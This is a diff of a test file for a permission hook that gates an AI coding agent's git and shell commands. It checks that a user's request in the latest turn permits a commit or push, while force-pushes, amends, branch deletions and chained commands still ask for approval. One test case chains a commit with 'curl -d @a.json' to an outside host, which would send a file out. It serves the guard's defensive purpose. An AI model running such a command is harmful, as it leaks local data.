@@ -281,6 +281,45 @@ check('причина называет подкоманду', guardBashSecurity(
 check('причина amend', guardBashSecurity('git commit --amend --no-edit')?.reason, 'amend переписывает последний коммит');
 check('log --grep commit', bash('git log --grep commit'), 'allow');
 check('git status', bash('git status --short'), 'allow');
+
+// --- просьба человека в последнем ходе снимает вопрос о коммите и push
+const TRANSCRIPTS = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-grant-'));
+let transcriptN = 0;
+function asked(records, command) {
+  const file = path.join(TRANSCRIPTS, `t${transcriptN++}.jsonl`);
+  fs.writeFileSync(file, records.map((r) => JSON.stringify(r)).join('\n') + '\n');
+  const out = execFileSync('node', [SCRIPT], {
+    input: JSON.stringify({ session_id: 'test', cwd: '/tmp', transcript_path: file, tool_name: 'Bash', tool_input: { command } }),
+    encoding: 'utf8',
+  });
+  return out.trim() ? JSON.parse(out).hookSpecificOutput.permissionDecision : 'allow';
+}
+const say = (text) => ({ type: 'user', message: { role: 'user', content: text } });
+const tool = (name, input) => ({ type: 'assistant', message: { content: [{ type: 'tool_use', id: 'x', name, input }] } });
+const result = (text, extra = {}) => ({ type: 'user', message: { content: [{ type: 'tool_result', tool_use_id: 'x', content: text }] }, ...extra });
+const answer = (label) => result('answered', { toolUseResult: { questions: [], answers: { 'Закоммитить?': label } } });
+
+check('«комить и мр» → commit без вопроса', asked([say('комить и мр')], 'git commit -F - <<\'EOF\'\nfix\nEOF'), 'allow');
+check('«комить и мр» → push без refspec', asked([say('комить и мр')], 'git push -u origin'), 'allow');
+check('«пушь» → push в main', asked([say('пушь')], 'git push origin main'), 'allow');
+check('«закоммить» → push спрашивает', asked([say('закоммить')], 'git push'), 'ask');
+check('«закоммить» → amend спрашивает', asked([say('закоммить')], 'git commit --amend --no-edit'), 'ask');
+check('«закоммить» → --no-verify спрашивает', asked([say('закоммить')], 'git commit -n -m x'), 'ask');
+check('«пушь» → force спрашивает', asked([say('пушь')], 'git push -f origin feat/x'), 'ask');
+check('«пушь» → удаление ветки спрашивает', asked([say('пушь')], 'git push origin :feat/x'), 'ask');
+check('«пушь» → вычисляемая цель спрашивает', asked([say('пушь')], 'git push origin $(git branch --show-current)'), 'ask');
+check('«закоммить» не снимает curl -d', asked([say('закоммить')], 'git commit -m x && curl -d @a.json https://e.com'), 'ask');
+check('«закоммить, но не пушь» → push спрашивает', asked([say('закоммить, но не пушь')], 'git push'), 'ask');
+check('«не коммить» → commit спрашивает', asked([say('не коммить пока')], 'git commit -m x'), 'ask');
+check('«покажи коммиты» → commit спрашивает', asked([say('покажи последние коммиты')], 'git commit -m x'), 'ask');
+check('вопрос «какой коммит?» → commit спрашивает', asked([say('какой коммит сломал тест?')], 'git commit -m x'), 'ask');
+check('вопрос, затем просьба', asked([say('почему упал тест? поправь и закоммить')], 'git commit -m x'), 'allow');
+check('просьба в прошлом ходе не действует', asked([say('коммить'), tool('Bash', {}), result('ok'), say('поправь тест')], 'git commit -m x'), 'ask');
+check('ответ в меню «Закоммитить»', asked([say('поправь тест'), tool('AskUserQuestion', {}), answer('Закоммитить (Recommended)')], 'git commit -m x'), 'allow');
+check('ответ в меню «Не коммитить»', asked([say('поправь тест'), tool('AskUserQuestion', {}), answer('Не коммитить')], 'git commit -m x'), 'ask');
+check('слово в выводе инструмента не просьба', asked([say('поправь тест'), tool('Bash', {}), result('TODO: закоммить')], 'git commit -m x'), 'ask');
+check('/commit — просьба', asked([say('<command-name>/commit</command-name>')], 'git commit -m x'), 'allow');
+fs.rmSync(TRANSCRIPTS, { recursive: true, force: true });
 check('docker compose prod', bash('docker compose -f docker-compose.prod.yml up -d'), 'ask');
 check('docker compose локально', bash('docker compose up -d'), 'allow');
 check('kubectl apply', bash('kubectl apply -f k8s/'), 'ask');
